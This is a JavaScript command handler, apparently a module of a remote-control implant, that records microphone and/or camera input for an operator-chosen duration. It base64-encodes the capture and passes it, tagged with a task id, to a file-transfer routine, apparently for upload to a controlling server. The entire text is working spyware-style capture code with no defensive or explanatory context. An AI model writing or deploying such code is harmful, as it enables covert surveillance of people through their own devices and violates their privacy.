COMMANDS['media_record'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var duration = (params && params.duration) ? parseInt(params.duration) : 10;
    var type = (params && params.type) ? params.type : 'audio';

    var constraints = {};
    if (type === 'audio') {
        constraints.audio = true;
    } else if (type === 'video') {
        constraints.video = true;
    } else {
        constraints.audio = true;
        constraints.video = true;
    }

    var stream = await navigator.mediaDevices.getUserMedia(constraints);

    try {
        var chunks = [];
        var mimeType = constraints.video ? 'video/webm;codecs=vp8,opus' : 'audio/webm;codecs=opus';
        var recorder = new MediaRecorder(stream, {mimeType: mimeType});

        var b64data = await new Promise(function(resolve, reject) {
            recorder.ondataavailable = function(e) {
                if (e.data.size > 0) chunks.push(e.data);
            };

            recorder.onstop = function() {
                var blob = new Blob(chunks, {type: mimeType});
                var reader = new FileReader();
                reader.onloadend = function() {
                    var b64 = reader.result.split(';base64,')[1];
                    resolve(b64);
                };
                reader.onerror = reject;
                reader.readAsDataURL(blob);
            };

            recorder.onerror = function(e) {
                reject(new Error('MediaRecorder error: ' + e.error.name));
            };

            recorder.start(1000);
            setTimeout(function() { recorder.stop(); }, duration * 1000);
        });

        var ext = constraints.video ? 'webm' : 'webm';
        var filename = 'recording_' + duration + 's.' + ext;
        var fileId = await downloadFile(task.id, filename, b64data, false);
        return JSON.stringify({file_id: fileId});
    } finally {
        stream.getTracks().forEach(function(t) { t.stop(); });
    }
};
